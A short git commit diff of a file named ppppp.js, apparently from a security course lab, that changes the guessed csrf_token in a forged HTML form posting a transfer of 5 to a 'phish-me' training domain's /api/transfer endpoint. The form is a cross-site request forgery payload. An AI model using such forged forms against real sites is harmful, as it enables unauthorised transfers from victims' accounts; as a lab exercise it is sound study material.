b3ea6e8a598e0026be3cc97c8bb326f20604ceea
Jetglider808 <76657559+Jetglider808@users.noreply.github.com>
2025-04-27 20:36:26 +1000

    Update ppppp.js

--- ppppp.js
+++ ppppp.js
@@ -3,7 +3,7 @@
   <body>
 
     <form id="csrf" action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
-      <input type="hidden" name="csrf_token" value="OTQ5Nw==">
+      <input type="hidden" name="csrf_token" value="OTU1MA==">
       <input type="hidden" name="username"   value="z5520080">
       <input type="hidden" name="amount"     value="5">
     </form>
